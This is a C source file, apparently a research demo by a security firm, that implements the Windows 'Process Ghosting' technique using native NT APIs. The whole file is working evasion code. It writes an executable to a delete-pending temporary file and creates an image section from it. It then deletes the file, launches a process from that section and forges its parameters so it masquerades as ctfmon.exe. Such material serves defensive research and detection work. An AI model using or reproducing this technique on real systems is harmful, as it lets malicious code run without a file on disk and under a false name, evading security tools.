/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#define PHNT_VERSION PHNT_WIN11
#include <phnt_windows.h>
#include <phnt.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[])
{
    NTSTATUS status;
    UNICODE_STRING fileName;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK isb;

    HANDLE hSourceFile = NULL;
    HANDLE hSourceFileSection = NULL;
    PVOID sourceFileData = NULL;
    HANDLE hTargetFile = NULL;
    HANDLE hImageSection = NULL;
    HANDLE hProcess = NULL;
    PRTL_USER_PROCESS_PARAMETERS parameters = NULL;

    wprintf_s(L"Demo for Process Ghosting by Hunt & Hackett.\r\n");
    wprintf_s(L"Usage: Ghosting.exe [filename]\r\n\r\n");

    if (argc > 1)
    {
        // Convert the user-supplied path to NT format
        status = RtlDosPathNameToNtPathName_U_WithStatus(
            argv[1],
            &fileName,
            NULL,
            NULL
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus: %x\r\n", status);
            goto CLEANUP;
        }
    }
    else
    {
        RtlInitUnicodeString(&fileName, L"\\SystemRoot\\system32\\cmd.exe");
    }

    // Open the source file
    InitializeObjectAttributes(&objAttr, &fileName, 0, NULL, NULL);
    status = NtOpenFile(
        &hSourceFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (argc > 1)
    {
        RtlFreeUnicodeString(&fileName);
    }

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine its size
    FILE_STANDARD_INFORMATION fileInfo;
    status = NtQueryInformationFile(
        hSourceFile,
        &isb,
        &fileInfo,
        sizeof(fileInfo),
        FileStandardInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationFile on source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Prepare to map it for copying and parsing
    status = NtCreateSection(
        &hSourceFileSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_COMMIT,
        hSourceFile
    );

    NtClose(hSourceFile);
    hSourceFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection on source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Map the source file as a data stream
    SIZE_T sourceMappingSize;
    sourceMappingSize = 0;

    status = NtMapViewOfSection(
        hSourceFileSection,
        NtCurrentProcess(),
        &sourceFileData,
        0,
        0,
        NULL,
        &sourceMappingSize,
        ViewUnmap,
        0,
        PAGE_READONLY
    );

    NtClose(hSourceFileSection);
    hSourceFileSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection on source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine the destination for a temporary file
    UNICODE_STRING tempFileName;
    WCHAR tempFileNameBuffer[MAX_PATH];
    fileName.Buffer = tempFileNameBuffer;
    fileName.Length = 0;
    fileName.MaximumLength = sizeof(tempFileNameBuffer);

    RtlInitUnicodeString(&tempFileName, L"\\??\\%TEMP%\\ghost.exe");
    status = RtlExpandEnvironmentStrings_U(NULL, &tempFileName, &fileName, NULL);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlExpandEnvironmentStrings_U for the temporary file: %x\r\n", status);
        goto CLEANUP;
    }

    InitializeObjectAttributes(&objAttr, &fileName, 0, NULL, NULL);

    // Create the temporary file
    status = NtCreateFile(
        &hTargetFile,
        DELETE | FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        &fileInfo.EndOfFile,
        FILE_ATTRIBUTE_TEMPORARY,
        0,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
        NULL,
        0
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateFile for the temporary file: %x\r\n", status);
        goto CLEANUP;
    }

    // Mark the temporary file for deletion
    FILE_DISPOSITION_INFORMATION disposition;
    disposition.DeleteFile = TRUE;
    status = NtSetInformationFile(
        hTargetFile,
        &isb,
        &disposition,
        sizeof(disposition),
        FileDispositionInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtSetInformationFile for the temporary file: %x\r\n", status);
        goto CLEANUP;
    }

    // Write the temporary file
    status = NtWriteFile(
        hTargetFile,
        NULL,
        NULL,
        NULL,
        &isb,
        sourceFileData,
        fileInfo.EndOfFile.LowPart,
        NULL,
        NULL
    );

    NtUnmapViewOfSection(NtCurrentProcess(), sourceFileData);
    sourceFileData = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteFile for the temporary file: %x\r\n", status);
        goto CLEANUP;
    }

    // Create an image section from the temporary file
    status = NtCreateSection(
        &hImageSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTargetFile
    );

    // Delete the temporary file
    NtClose(hTargetFile);
    hTargetFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection for the image: %x\r\n", status);
        return status;
    }

    // Create a process object
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        0,
        hImageSection,
        NULL,
        NULL,
        0
    );

    NtClose(hImageSection);
    hImageSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateProcessEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine its PEB location
    PROCESS_BASIC_INFORMATION processInfo;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &processInfo,
        sizeof(processInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess: %x\r\n", status);
        goto CLEANUP;
    }

    if (!processInfo.PebBaseAddress)
    {
        status = STATUS_ASSERTION_FAILURE;
        wprintf_s(L"PEB is NULL\r\n");
        goto CLEANUP;
    }

    // Prepare the process parameters block
    UNICODE_STRING imageName;
    UNICODE_STRING currentDir;
    UNICODE_STRING windowName;

    RtlInitUnicodeString(&imageName, L"C:\\Windows\\system32\\ctfmon.exe");
    RtlInitUnicodeString(&currentDir, L"C:\\Windows\\system32");
    RtlInitUnicodeString(&windowName, L"Hello from a ghost process!");

    status = RtlCreateProcessParametersEx(
        &parameters,
        &imageName,
        &currentDir,
        &currentDir,
        &imageName,
        RtlGetCurrentPeb()->ProcessParameters->Environment,
        &windowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlCreateProcessParametersEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Allocate space for the process parameter block in the target
    SIZE_T paramsSize;
    PVOID paramsRemote;
    SIZE_T paramsRemoteSize;

    paramsSize = (SIZE_T)parameters->MaximumLength + parameters->EnvironmentSize;
    paramsRemote = NULL;
    paramsRemoteSize = paramsSize;

    status = NtAllocateVirtualMemory(
        hProcess,
        &paramsRemote,
        0,
        &paramsRemoteSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtAllocateVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Switch the process parameters to a denormalized form that uses offsets instead of
    // absolute pointers. The target's ntdll will normalize them back on initialization.
    RtlDeNormalizeProcessParams(parameters);

    // Unfortunately, denormalization doesn't apply to the environment pointer, so we need
    // to adjust it to be valid remotely.
    (ULONG_PTR)parameters->Environment += (ULONG_PTR)paramsRemote - (ULONG_PTR)parameters;

    // Write process parameters block to the target
    status = NtWriteVirtualMemory(hProcess, paramsRemote, parameters, paramsSize, NULL);
    RtlDestroyProcessParameters(parameters);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Update the reference in PEB
    status = NtWriteVirtualMemory(
        hProcess,
        &processInfo.PebBaseAddress->ProcessParameters,
        &paramsRemote,
        sizeof(paramsRemote),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres reference: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine parameters for the initial thread
    SECTION_IMAGE_INFORMATION imageInfo;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessImageInformation,
        &imageInfo,
        sizeof(imageInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for image info: %x\r\n", status);
        goto CLEANUP;
    }

    // Create the initial thread
    HANDLE hThread;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        imageInfo.TransferAddress,
        NULL,
        0,
        imageInfo.ZeroBits,
        imageInfo.CommittedStackSize,
        imageInfo.MaximumStackSize,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateThreadEx: %x\r\n", status);
        goto CLEANUP;
    }

    NtClose(hProcess);
    hProcess = NULL;

    NtClose(hThread);
    hThread = NULL;

    status = STATUS_SUCCESS;
    wprintf_s(L"Successfully created process with PID %zu.\r\n",
        (ULONG_PTR)processInfo.UniqueProcessId);

CLEANUP:

    if (hSourceFile)
        NtClose(hSourceFile);

    if (hSourceFileSection)
        NtClose(hSourceFileSection);

    if (sourceFileData)
        NtUnmapViewOfSection(NtCurrentProcess(), sourceFileData);

    if (hTargetFile)
        NtClose(hTargetFile);

    if (hImageSection)
        NtClose(hImageSection);

    if (hProcess)
    {
        NtTerminateProcess(hProcess, STATUS_UNSUCCESSFUL);
        NtClose(hProcess);
    }

    return status;
}
